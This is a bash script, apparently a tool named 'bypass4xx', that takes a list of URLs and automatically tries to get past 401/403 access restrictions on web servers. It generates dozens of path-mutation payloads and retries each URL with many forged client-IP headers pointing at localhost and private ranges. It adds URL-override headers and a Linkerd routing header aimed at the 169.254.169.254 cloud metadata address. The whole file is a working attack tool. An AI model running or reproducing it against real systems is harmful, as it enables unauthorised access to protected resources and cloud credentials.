#!/bin/bash

#if [ -z $1 ]; then echo "Usage: bypass4xx [URL]"; exit; fi

urls=$(cat -)

if [ -f 4xxpayloads ]; then rm 4xxpayloads; fi
for url in $urls
do

httpx="./httpx -rate-limit 2 -timeout 15 -retries 5 -silent -status-code -content-length -method -no-color -follow-redirects -max-redirects 4 -mc 200  "

base=$(echo "$(echo "$url" | cut -d/ -f1,2,3)")
path=$(echo "/$(echo "$url" | cut -d/ -f4-)") #| sed 's/\/$//g')
ips=$(dig "$(echo "$base" | cut -d/ -f 3)" +short)
payloads=("$url")
filename=$(echo $url | grep -oE "[^/]+/?$" | grep -oE "^[^/]+")
fileurlenc=$(printf $filename | od -An -tx1 -v | tr ' ' % | sed 's/%0a//g')
filename1st=$(printf $url | grep -oE "[^/]+/?$" | grep -oE ^.)
fileurlenc1st=$(printf $filename1st | grep -oE "[^/]+/?$" | grep -oE "^." | od -An -tx1 -v  | tr ' ' % | sed 's/%0a//g')

headers=" -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Client-IP: 127.0.0.1' -H 'Forwarded-For-Ip: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-For-Original: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-By: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Forwared-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Cluster-Client-IP: 127.0.0.1' -H 'Fastly-Client-IP: 127.0.0.1' -H 'X-debug: 1' -H 'debug: 1' -H 'CACHE_INFO: 127.0.0.1' -H 'CLIENT_IP: 127.0.0.1' -H 'COMING_FROM: 127.0.0.1' -H 'CONNECT_VIA_IP: 127.0.0.1' -H 'FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-CLIENT-IP: 127.0.0.1' -H 'HTTP-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-PC-REMOTE-ADDR: 127.0.0.1' -H 'HTTP-PROXY-CONNECTION: 127.0.0.1' -H 'HTTP-VIA: 127.0.0.1' -H 'HTTP-X-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-X-IMFORWARDS: 127.0.0.1' -H 'HTTP-XROXY-CONNECTION: 127.0.0.1' -H 'PC_REMOTE_ADDR: 127.0.0.1' -H 'PRAGMA: 127.0.0.1' -H 'PROXY: 127.0.0.1' -H 'PROXY_AUTHORIZATION: 127.0.0.1' -H 'PROXY_CONNECTION: 127.0.0.1' -H 'REMOTE_ADDR: 127.0.0.1' -H 'VIA: 127.0.0.1' -H 'X_COMING_FROM: 127.0.0.1' -H 'X_DELEGATE_REMOTE_HOST: 127.0.0.1' -H 'X_FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_FORWARDED_FOR_IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_IMFORWARDS: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_LOOKING: 127.0.0.1' -H 'XONNECTION: 127.0.0.1' -H 'XPROXY: 127.0.0.1' -H 'l5d-dtab: /$/inet/169.254.169.254/80' -H 'XROXY_CONNECTION: 127.0.0.1' -H 'ZCACHE_CONTROL: 127.0.0.1' "

# /api => /api/.
payloads+=("$base$(echo $path | awk '{print $0"."}')")

# /api => /api/./
payloads+=("$base$(echo $path | awk '{print $0"./"}')")

# /api => /api/*
payloads+=("$base$(echo $path | awk '{print $0"*"}')")

# /api => /api.;/
payloads+=("$base$(echo $path | sed 's/\/$/\.\.;\//g')")

# /api => /api;/
payloads+=("$base$(echo $path | sed 's/\/$/;\//g')")

# /api => /api/%20
payloads+=("$base$(echo $path | awk '{print $0"%20"}')")

# /api => /api/%2e
payloads+=("$base$(echo $path | awk '{print $0"%2e"}')")

# /api => /api/~
payloads+=("$base$(echo $path | awk '{print $0"~"}')")

# /api => /api/%09
payloads+=("$base$(echo $path | awk '{print $0"%09"}')")


payloads+=("$base$(echo $path | awk '{print $0"/."}')")


payloads+=("$base$(echo $path | awk '{print $0"/./"}')")

# /api => /./api/./
payloads+=("$base$(echo $path | awk '{print "/./"$0"/./"}')")


payloads+=("$base$(echo $path | awk '{print $0"/*"}')")

# /api => /api/#
payloads+=("$base$(echo $path | awk '{print $0"#"}')")

# /api => /api..;/
payloads+=("$base$(echo $path | awk '{print $0"..;/"}')")


payloads+=("$base$(echo $path | awk '{print $0";/"}')")


payloads+=("$base$(echo $path | awk '{print $0"/%20"}')")


payloads+=("$base$(echo $path | awk '{print $0"/%2e"}')")

# /api = /api/~
payloads+=("$base$(echo $path | awk '{print $0"/~"}')")


payloads+=("$base$(echo $path | awk '{print $0"/%09"}')")

# /api => /api/.json
payloads+=("$base$(echo $path | awk '{print $0"/.json"}')")

# /api => /%61%70%69
payloads+=("$base$(echo $path | sed "s/$filename/$fileurlenc/g")")

# /api => /%61pi
payloads+=("$base$(echo $path | sed "s/\(.*\)\/$filename1st/\1\/$fileurlenc1st/g")")

# /api => /api.json
payloads+=("$base$(echo $path | awk '{print $0".json"}')")

# /api => /.;/api
payloads+=("$base$(echo "/.;$path")")

# /api => /api?params
payloads+=("$base$(echo $path | awk '{print $0"?gg"}')")

# /api => /%20/api
payloads+=("$base$(echo $path | sed 's/\//\/%20\//g')")

# /api => /%2e/api
payloads+=("$base$(echo $path | sed 's/\//\/%2e\//g')")

# /api => /API
payloads+=("$base$(echo $path | awk '{print toupper($0)}')")

# /api => /./api
payloads+=("$base$(echo $path | sed 's#/#/./#1')")

# /api => //api
payloads+=("$base$(echo $path | sed 's/\//\/\//g')")

# https => http
# http => https
if [ $(echo "$url" | grep https | wc -l) -gt 0 ]; then
        payloads+=("$(echo $url | sed 's/https/http/g')")
        # /api => https://IP/api
        payloads+=($(echo $ips | grep -oE "[0-9]{2,}\.[0-9]{2,}\.[0-9]{2,}\.[0-9]{2,}" | awk -v scheme='https://' -v var=$path '{print scheme$0var}'))
else
        payloads+=("$(echo $url | sed 's/http/https/g')")
        # /api => https://IP/api
        payloads+=($(echo $ips | grep -oE "[0-9]{2,}\.[0-9]{2,}\.[0-9]{2,}\.[0-9]{2,}" | awk -v scheme='http://' -v var=$path '{print scheme$0var}'))
fi

echo ${payloads[*]} | tr ' ' '\n' >> 4xxpayloads

if [[ ! "$path" =~ "/"$ ]]
then
        resultGET=$(curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $path" -H "X-Override-URL: $path" -H "X-Rewrite-URL: $path" -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Client-IP: 127.0.0.1' -H 'Forwarded-For-Ip: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-For-Original: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-By: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Forwared-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Cluster-Client-IP: 127.0.0.1' -H 'Fastly-Client-IP: 127.0.0.1' -H 'X-debug: 1' -H 'debug: 1' -H 'CACHE_INFO: 127.0.0.1' -H 'CLIENT_IP: 127.0.0.1' -H 'COMING_FROM: 127.0.0.1' -H 'CONNECT_VIA_IP: 127.0.0.1' -H 'FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-CLIENT-IP: 127.0.0.1' -H 'HTTP-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-PC-REMOTE-ADDR: 127.0.0.1' -H 'HTTP-PROXY-CONNECTION: 127.0.0.1' -H 'HTTP-VIA: 127.0.0.1' -H 'HTTP-X-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-X-IMFORWARDS: 127.0.0.1' -H 'HTTP-XROXY-CONNECTION: 127.0.0.1' -H 'PC_REMOTE_ADDR: 127.0.0.1' -H 'PRAGMA: 127.0.0.1' -H 'PROXY: 127.0.0.1' -H 'PROXY_AUTHORIZATION: 127.0.0.1' -H 'PROXY_CONNECTION: 127.0.0.1' -H 'REMOTE_ADDR: 127.0.0.1' -H 'VIA: 127.0.0.1' -H 'X_COMING_FROM: 127.0.0.1' -H 'X_DELEGATE_REMOTE_HOST: 127.0.0.1' -H 'X_FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_FORWARDED_FOR_IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_IMFORWARDS: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_LOOKING: 127.0.0.1' -H 'XONNECTION: 127.0.0.1' -H 'XPROXY: 127.0.0.1' -H 'l5d-dtab: /$/inet/169.254.169.254/80' -H 'XROXY_CONNECTION: 127.0.0.1' -H 'ZCACHE_CONTROL: 127.0.0.1' $base)
        
        if [[ $(echo $resultGET | grep "200,") ]];
        then
                printf $resultGET | tr -d "\n" && echo -e " -> curl -X GET -k -s -H '"X-Original-URL: "$path' -H '"X-Override-URL: "$path' -H '"X-Rewrite-URL: "$path' $base"
        fi

        resultPOST=$(curl -X POST -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-length: 0" -H "X-Original-URL: $path" -H "X-Override-URL: $path" -H "X-Rewrite-URL: $path" -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Client-IP: 127.0.0.1' -H 'Forwarded-For-Ip: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-For-Original: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-By: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Forwared-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Cluster-Client-IP: 127.0.0.1' -H 'Fastly-Client-IP: 127.0.0.1' -H 'X-debug: 1' -H 'debug: 1' -H 'CACHE_INFO: 127.0.0.1' -H 'CLIENT_IP: 127.0.0.1' -H 'COMING_FROM: 127.0.0.1' -H 'CONNECT_VIA_IP: 127.0.0.1' -H 'FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-CLIENT-IP: 127.0.0.1' -H 'HTTP-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-PC-REMOTE-ADDR: 127.0.0.1' -H 'HTTP-PROXY-CONNECTION: 127.0.0.1' -H 'HTTP-VIA: 127.0.0.1' -H 'HTTP-X-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-X-IMFORWARDS: 127.0.0.1' -H 'HTTP-XROXY-CONNECTION: 127.0.0.1' -H 'PC_REMOTE_ADDR: 127.0.0.1' -H 'PRAGMA: 127.0.0.1' -H 'PROXY: 127.0.0.1' -H 'PROXY_AUTHORIZATION: 127.0.0.1' -H 'PROXY_CONNECTION: 127.0.0.1' -H 'REMOTE_ADDR: 127.0.0.1' -H 'VIA: 127.0.0.1' -H 'X_COMING_FROM: 127.0.0.1' -H 'X_DELEGATE_REMOTE_HOST: 127.0.0.1' -H 'X_FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_FORWARDED_FOR_IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_IMFORWARDS: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_LOOKING: 127.0.0.1' -H 'XONNECTION: 127.0.0.1' -H 'XPROXY: 127.0.0.1' -H 'l5d-dtab: /$/inet/169.254.169.254/80' -H 'XROXY_CONNECTION: 127.0.0.1' -H 'ZCACHE_CONTROL: 127.0.0.1' $base)
        
        if [[ $(printf $resultPOST | grep "200,") ]];
        then
                printf $resultPOST | tr -d "\n" && echo -e " -> curl -X POST -k -s -H '"X-Original-URL: "$path' -H '"X-Override-URL: "$path' -H '"X-Rewrite-URL: "$path' $base"
        fi

        resultPUT=$(curl -X PUT -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-length: 0" -H "X-Original-URL: $path" -H "X-Override-URL: $path" -H "X-Rewrite-URL: $path" -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Client-IP: 127.0.0.1' -H 'Forwarded-For-Ip: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-For-Original: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded-By: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Forwarded: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Forwared-Host: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Cluster-Client-IP: 127.0.0.1' -H 'Fastly-Client-IP: 127.0.0.1' -H 'X-debug: 1' -H 'debug: 1' -H 'CACHE_INFO: 127.0.0.1' -H 'CLIENT_IP: 127.0.0.1' -H 'COMING_FROM: 127.0.0.1' -H 'CONNECT_VIA_IP: 127.0.0.1' -H 'FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-CLIENT-IP: 127.0.0.1' -H 'HTTP-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-PC-REMOTE-ADDR: 127.0.0.1' -H 'HTTP-PROXY-CONNECTION: 127.0.0.1' -H 'HTTP-VIA: 127.0.0.1' -H 'HTTP-X-FORWARDED-FOR-IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'HTTP-X-IMFORWARDS: 127.0.0.1' -H 'HTTP-XROXY-CONNECTION: 127.0.0.1' -H 'PC_REMOTE_ADDR: 127.0.0.1' -H 'PRAGMA: 127.0.0.1' -H 'PROXY: 127.0.0.1' -H 'PROXY_AUTHORIZATION: 127.0.0.1' -H 'PROXY_CONNECTION: 127.0.0.1' -H 'REMOTE_ADDR: 127.0.0.1' -H 'VIA: 127.0.0.1' -H 'X_COMING_FROM: 127.0.0.1' -H 'X_DELEGATE_REMOTE_HOST: 127.0.0.1' -H 'X_FORWARDED: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_FORWARDED_FOR_IP: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_IMFORWARDS: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1' -H 'X_LOOKING: 127.0.0.1' -H 'XONNECTION: 127.0.0.1' -H 'XPROXY: 127.0.0.1' -H 'l5d-dtab: /$/inet/169.254.169.254/80' -H 'XROXY_CONNECTION: 127.0.0.1' -H 'ZCACHE_CONTROL: 127.0.0.1' $base)
        
        if [[ $(echo $resultPUT | grep "200,") ]];
        then
                printf $resultPUT | tr -d "\n" && echo -e " -> curl -X PUT -k -s -H '"X-Original-URL: "$path' -H '"X-Override-URL: "$path' -H '"X-Rewrite-URL: "$path' $base"
        fi
fi

done


#cat 4xxpayloads

cat 4xxpayloads | $httpx $headers

cat 4xxpayloads | $httpx $headers -H "Content-length: 0" -x ALL



























